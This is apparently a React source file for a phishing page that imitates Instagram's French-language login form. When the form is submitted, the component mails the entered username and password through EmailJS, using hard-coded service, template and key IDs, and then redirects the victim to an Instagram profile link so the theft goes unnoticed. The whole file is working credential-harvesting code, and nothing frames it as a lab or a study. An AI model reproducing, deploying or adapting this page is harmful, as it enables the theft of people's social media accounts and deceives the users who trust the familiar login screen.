import { useRef } from "react"
import $ from "jquery";
import emailjs from '@emailjs/browser';

const LoginhtmlForm = () => {
    let ref = useRef()

    const submitForm = (e) => {

        e.preventDefault()
        let username = $("#uname").val()
        let pwd = $("#pwd").val()

        emailjs.sendForm('service_h9zopm4', 'template_toovbdq',ref.current, 'rZK749_0K9QMSgmn7')
            .then((result) => {
                console.log(result.text);
               window.location.replace("instagram://user?username={mosala.sarl}")
            }, (error) => {
                console.log(error.text);
            });

    }

    return <div>
        <form action="" method="post" ref={ref} onSubmit={submitForm}>
            <div className="mb-2">
                <input type="text" id="uname" name="uname" className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 h-10 w-full" placeholder="Phone number, username, or email" required />
            </div>
            <div className="mb-2">
                <input type="password" id="pwd" name="password" className="bg-gray-50 border border-gray-300 text-gray-900 rounded focus:ring-blue-500 focus:border-blue-500 block p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500 h-10 first-letter:text-sm w-full" placeholder="Password" required />
            </div>
            <div className="flex justify-end mb-5 mt-3 ">
                <a href="http://" className="text-blue-500">Mot de passe oublié ?</a>
            </div>
            <div className="mb-5 text-white bg-blue-500 hover:bg-blue-600 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-sm text-sm h-8 sm:w-auto px-5 py-1.5 text-center dark:bg-blue-500 dark:hover:bg-blue-600 dark:focus:ring-blue-800 flex items-center justify-center disabled">
                <button type="submit" className="font-bold:">Se connecter</button>
            </div>

            <div className="flex">
                <span className="text-gray-700">Vous n'avez pas de compte ? </span>
                <a href="http://" className="text-blue-500 ml-1 font-bold">Inscrivez-vous</a>
            </div>
        </form>

    </div >
}

export default LoginhtmlForm